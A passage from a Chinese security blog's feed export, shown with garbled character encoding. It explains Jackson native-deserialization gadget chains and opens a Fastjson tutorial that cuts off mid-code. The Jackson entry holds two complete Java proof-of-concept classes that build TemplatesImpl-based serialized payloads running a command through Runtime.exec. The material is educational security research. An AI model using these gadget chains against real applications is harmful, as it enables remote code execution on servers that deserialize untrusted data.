alt="image-20240803155529534"></p><p>å‚è€ƒï¼š</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247496898&idx=1&sn=9df9a236a3c437522bdf125cf92c6e24&chksm=c172e553f6056c4592696a15d5270e30386a229ca35d8eb1cf588498c95d78b28f2766975234&scene=27&key=7917b196593e1041903cc963f4d8e8dd309fc34822ec523c96ef6852b6eb00243ae09c3a475f21000c466a1481f5d9ef88661e5ccd3eae00b654271eecd790081cf9cb2b874e0566a9b1bf83ab3e3a9dffbce029a9983bd1e617a34873e1a5cf0d90ff63073904c1c64a7ab0832fd5396612ac69385a93896810c27b3466f6ca&ascene=0&uin=MzM0MTE3MTk2MQ==&devicetype=Windows+10+x64&version=6308011a&lang=zh_CN&exportkey=n_ChQIAhIQk1l7Og6o32ldfRBgt0m/7xLgAQIE97dBBAEAAAAAAFyoNDyY7FgAAAAOpnltbLcz9gKNyK89dVj0STE6v0lILRu1tKDn0ZDKVMzBwrLXZCB+mUzHXSOZsIYr0w0A/cuvTqwms4Rt/kjpf8zHxxTi8IwvjYn/DZ9Q33Hc5vfX2hilkR53helcExsLrLyslL/WBsef9XI/6wZMWmG6oy8JJGplsmLrW+xqvmnB4f5wILv176CzXoS3esuvsQ+hfcDKd/Efu5bUKYhs0ZoGh1vCyZD6VtP9NEg2tTCVHV3tJAqerIo+gJoEHIoL7rOFzs/q0qic&acctmode=0&pass_ticket=Q7/iUlx9i6XS/NSi17wpXoqBYZHAHgY0basv8D4BZIN+CoAkTfFeOqqNDBcbXW05phWaLHgqOHGN8cecKlsdgw==&wx_header=1&fontgear=2">SnakeYamlååºåˆ—åŒ–åŠä¸å‡ºç½‘åˆ©ç”¨</a></p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/snakeyaml">SnakeYaml | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jackson</title>
    <link href="/2024/08/03/Jackson/"/>
    <url>/2024/08/03/Jackson/</url>
    
    <content type="html"><![CDATA[<p>Jacksonè·Ÿfastjsonå¾ˆç›¸è¿‘ï¼Œæ‰€ä»¥å‰è¨€è¿˜æ˜¯ä»fastjsonè¿‡æ¸¡è¿‡æ¥ã€‚</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸»è¦è¿˜æ˜¯ä»‹ç»JacksonåŸç”Ÿååºåˆ—åŒ–å¼•ç”¨ã€‚</p><p>è¿™é‡Œä»Fastjsoné‡æ–°å¼€å§‹è¯´èµ·ï¼š</p><p>åœ¨Fastjsonä¸­ï¼Œ<code>JSONArray</code>å’Œ<code>JSONObject</code>éƒ½å®ç°äº†<code>Serializable</code>æ¥å£ï¼Œè¿™ä¸¤ä¸ªç±»çš„<code>toString</code>æ–¹æ³•éƒ½èƒ½è§¦å‘<code>toJSONString</code>çš„è°ƒç”¨ï¼Œè¦æŠŠä¸€ä¸ªJSONå¯¹è±¡è½¬å­—ç¬¦ä¸²ï¼Œå¿…ç„¶æ¶‰åŠåˆ°å¯¹è±¡å±æ€§çš„è·å–ï¼Œä¼šè°ƒç”¨åˆ°å¯¹è±¡çš„getteræ–¹æ³•ã€‚</p><p>ä»1.2.49å¼€å§‹ï¼Œ<code>JSONArray</code>å’Œ<code>JSONObject</code>éƒ½å®ç°äº†è‡ªå·±çš„<code>readObject</code>æ–¹æ³•ï¼Œè‡ªå®šä¹‰äº†ä¸€ä¸ª<code>SecureObjectInputStream</code>å¹¶é‡å†™äº†<code>resolveClass</code>æ–¹æ³•ï¼Œé‡Œé¢è°ƒç”¨äº†<code>checkAutoType</code>æ¥å¯¹ååºåˆ—åŒ–çš„ç±»è¿›è¡Œé»‘ç™½åå•æ£€æŸ¥ã€‚éœ€è¦é€šè¿‡åŸç”Ÿååºåˆ—åŒ–çš„å¼•ç”¨æœºåˆ¶æ¥ç»•è¿‡ã€‚</p><p>åˆ©ç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">toString(e.g. BadAttributeValueExpException#readObject) <br>-&gt; toJSONString <br>-&gt; evil <span class="hljs-title function_">getter</span><span class="hljs-params">(e.g. TemplatesImpl#getOutputProperties)</span><br></code></pre></td></tr></table></figure><h2 id="Jackson-æµ…å®¡"><a href="#Jackson-æµ…å®¡" class="headerlink" title="Jackson æµ…å®¡"></a>Jackson æµ…å®¡</h2><p>Jacksonçš„ä½¿ç”¨å’ŒFastjsonç±»ä¼¼</p><table><thead><tr><th align="left">FastJson</th><th align="left">Jackson</th></tr></thead><tbody><tr><td align="left">JSONObject</td><td align="left">ObjectNode</td></tr><tr><td align="left">JSONArray</td><td align="left">ArrayNode</td></tr><tr><td align="left">JSON.parseObjecté™æ€è°ƒç”¨</td><td align="left">ObjectMapper.readTreeå¯¹è±¡è°ƒç”¨</td></tr></tbody></table><p>ç»§æ‰¿å…³ç³»ï¼š<code>POJONode</code>-&gt;<code>ValueNode</code>-&gt;<code>BaseJsonNode</code> -&gt; <code>JsonNode</code></p><p>åˆ©ç”¨ç‚¹åœ¨<code>BaseJsonNode#toString</code>ï¼Œè·Ÿåˆ°åé¢ ï¼Œå¯¹äºè‡ªå®šä¹‰çš„ç±»ä½¿ç”¨<code>BeanSerializer</code>è¿›è¡Œååºåˆ—åŒ–ï¼Œè°ƒç”¨<code>serializeFields</code>å¯¹å±æ€§è¿›è¡Œè¿˜åŸæ—¶,<code>BeanPropertyWriter</code>è°ƒç”¨<code>getter</code>ã€‚</p><p>è¿˜æ˜¯ç”¨<code>TemplatesImpl#getOutputProperties</code>å»æ‰“ï¼Œä½†æ˜¯è¿™é‡Œç›´æ¥ååºåˆ—åŒ–ä¼šå‡ºç°é—®é¢˜</p><blockquote><p>Failed to JDK serialize <code>POJONode</code> value: (was java.lang.NullPointerException) (through reference chain: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl[â€œoutputPropertiesâ€])</p></blockquote><p>æŠ¥é”™StackTraceï¼š</p><p><img src="/2024/08/03/Jackson/image-20240803150351459.png" alt="image-20240803150351459"></p><p><code>invokeWriteReplace</code>åˆ¤æ–­<code>writeReplaceMethod</code>æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨åˆ™è°ƒç”¨ï¼š</p><p><img src="/2024/08/03/Jackson/image-20240803150432510.png" alt="image-20240803150432510"></p><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ä½¿ç”¨javassistæŠŠè¿™ä¸ªç±»çš„<code>writeReplaceMethod</code>åˆ æ‰å³å¯ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// å»é™¤BaseJsonNodeçš„writeReplaceæ–¹æ³•</span><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span>ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(ctMethod);<br>        ctClass.toClass();<br><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setValue(bd, <span class="hljs-string">&quot;val&quot;</span>, pojo);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(bd);<br>        oos.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¨³å®šç‰ˆæœ¬ï¼š<a href="https://xz.aliyun.com/t/12846?time__1311=GqGxuDcDRGexlxx2DUrED9G5Witkv5ox">ä»JSON1é“¾ä¸­å­¦ä¹ å¤„ç†JACKSONé“¾çš„ä¸ç¨³å®šæ€§ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JSON</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(writeReplace);<br>        ctClass.toClass();<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(makeTemplatesImplAopProxy(<span class="hljs-string">&quot;calc&quot;</span>));<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, node);<br><br>        serialize(val);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        ois.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeTemplatesImplAopProxy</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(makeTemplatesImpl(cmd));<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeTemplatesImpl</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-keyword">return</span> templates;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹äºJacksonçš„getteråˆ©ç”¨ï¼Œä¹Ÿå¯ä»¥çœ‹ï¼š</p><p><a href="https://z3r4y.blog.csdn.net/article/details/136889141">ã€Webã€‘æµ…èŠJacksonåºåˆ—åŒ–getterçš„åˆ©ç”¨â€”â€”POJONode-CSDNåšå®¢</a></p><p>è¿™é‡ŒZ3r4yå¸ˆå‚…ä»‹ç»äº†Jacksonçš„getteråˆ©ç”¨Templateå’ŒSignedObjectäºŒæ¬¡ååºåˆ—åŒ–çš„å†…å®¹ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/fastjson/jackson">Jacksonçš„åŸç”Ÿååºåˆ—åŒ–åˆ©ç”¨ | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson</title>
    <link href="/2024/08/01/fastjson/"/>
    <url>/2024/08/01/fastjson/</url>
    
    <content type="html"><![CDATA[<p>åˆ°äº†å–œé—»ä¹è§çš„Fastjsonã€‚</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>Fastjson æ˜¯é˜¿é‡Œå·´å·´çš„å¼€æº JSON è§£æåº“ï¼Œæ”¯æŒå°† Java Bean åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä» JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ° JavaBeanã€‚é¡¾åæ€ä¹‰ï¼ŒFastJsonçš„ç‰¹ç‚¹å°±æ˜¯å¿«ã€‚</p><p>å…ˆä»æœ€ç®€å•çš„ç”¨æ³•è¯´èµ·å§ã€‚</p><h2 id="Basic-Usage"><a href="#Basic-Usage" class="headerlink" title="Basic Usage"></a>Basic Usage</h2><p>ä¾èµ–ç”¨çš„1.2.23</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.23<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="POJO-JSON"><a href="#POJO-JSON" class="headerlink" title="POJO &#x3D;&gt; JSON"></a>POJO &#x3D;&gt; JSON</h3><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JSON.toJSONString()<br></code></pre></td></tr></table></figure><p>å‚æ•°è®¾ç½®ï¼š</p><ul><li><p>SerializerFeature.WriteClassName</p><p>åºåˆ—åŒ–æ—¶ï¼Œä¼šå¤šå‡ºä¸€ä¸ª<code>@type</code>è·Ÿä¸Šç±»å</p></li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> Integer age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(Integer age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, Integer age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Non-Arg Constructor&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I am &quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot; and &quot;</span> + <span class="hljs-built_in">this</span>.age + <span class="hljs-string">&quot; years old&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><span class="hljs-keyword">import</span> org.example.Person;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span 